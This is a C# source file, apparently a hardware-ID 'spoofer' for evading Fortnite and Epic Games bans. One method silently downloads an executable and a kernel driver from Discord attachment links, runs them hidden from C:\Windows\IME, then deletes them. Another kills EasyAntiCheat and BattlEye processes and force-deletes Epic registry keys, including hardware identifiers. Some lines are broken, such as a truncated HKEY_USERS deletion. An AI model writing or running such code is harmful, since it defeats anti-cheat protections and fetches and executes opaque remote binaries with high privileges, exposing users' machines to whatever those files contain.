using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.IO;

namespace JONGERS

{ 
    class Spoofer
{
    public static void Spoof()
    {
        WebClient webClient = new WebClient();

        string text = @"C:\Windows\IME\VITAL9999.exe";

        string text2 = @"C:\Windows\IME\9999.sys";

        webClient.DownloadFile("https://cdn.discordapp.com/attachments/837529165422657587/845853563070447616/9999.sys", text2); 

        webClient.DownloadFile("https://cdn.discordapp.com/attachments/837529165422657587/845853442283143188/VITAL9999.exe", text); 

            Process process = new Process();

        process.StartInfo.FileName = "cmd.exe";

        process.StartInfo.UseShellExecute = true;

        process.StartInfo.CreateNoWindow = true;

            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

        process = Process.Start(text, text2);

        Thread.Sleep(1000);

        process.Close();

        File.Delete(text2);

        File.Delete(text);
    }
    public static void Clean()
    {
        Process process = new Process();

        process.StartInfo.FileName = "cmd.exe";

        process.StartInfo.RedirectStandardInput = true;

        process.StartInfo.RedirectStandardError = true;

        process.StartInfo.RedirectStandardOutput = true;

        process.StartInfo.UseShellExecute = false;

        process.StartInfo.CreateNoWindow = true;

        process.Start(); /// epicgames

        process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");

        process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");

        process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");

        process.StandardInput.WriteLine("taskkill /f /im BEService.exe");

        process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");

        process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");

        process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");

        process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");

        process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");

        process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");

        process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");

        process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");

        process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\");

        process.StandardInput.WriteLine("Done!"); 
        }

        internal static void Close()
        {
            throw new NotImplementedException();
        }
    }
}
